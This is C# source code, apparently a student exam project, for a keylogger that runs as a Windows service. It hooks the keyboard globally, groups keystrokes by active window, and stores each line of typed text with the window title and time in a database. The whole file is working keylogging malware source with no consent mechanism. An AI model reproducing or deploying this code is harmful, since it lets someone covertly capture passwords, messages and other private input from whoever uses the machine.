using Keystroke.API;
using Keystroke.API.CallbackObjects;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Topshelf.Logging;

namespace KeyLoggerExample
{
    public class ServicioKeyLogger
    {
        private static readonly LogWriter log = HostLogger.Get<ServicioKeyLogger>();
        static Dictionary<string, string> characterBuffer = new Dictionary<string, string>();

        public bool Comenzar()
        {
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { proccessKey(character); });
                Application.Run();
            }
            return true;
        } 

        private static void proccessKey(KeyPressed keyPressed)
        {
            string ventanaActual = keyPressed.CurrentWindow;
            string bufferDeTeclasTipeadas = characterBuffer.ContainsKey(ventanaActual) ? characterBuffer[ventanaActual] : null;
            if (KeyCode.Return == keyPressed.KeyCode)
            {
                if (bufferDeTeclasTipeadas != null)
                {
                    Console.WriteLine(ventanaActual + " : " + bufferDeTeclasTipeadas);
                    ServicioKeyLogger.AddDatabaseLog(ventanaActual, bufferDeTeclasTipeadas);
                    //log.InfoFormat(ventanaActual + " : " + bufferDeTeclasTipeadas);

                    characterBuffer[ventanaActual] = null;
                }
            }
            else
            {
                if (bufferDeTeclasTipeadas != null)
                {
                    characterBuffer[ventanaActual] = bufferDeTeclasTipeadas + keyPressed;
                }
                else
                {
                    characterBuffer[ventanaActual] = "" + keyPressed;
                }
            }
        }

        private static void AddDatabaseLog(string ventanaActual, string bufferDeTeclasTipeadas)
        {
            try
            {
                DBExamenFinalEntities1 db = new DBExamenFinalEntities1();
                LogKeyLogger log = new LogKeyLogger();
                log.Cadena = bufferDeTeclasTipeadas;
                log.Programa = ventanaActual;
                log.Hora = DateTime.Now;

                db.LogKeyLogger.Add(log);
                db.SaveChanges();
            }
            catch(Exception ex)
            {
                log.InfoFormat(ex.ToString());
            }
            
        }

        public bool Detenerse()
        {
            Application.Exit();
            return true;
        }
    }
}
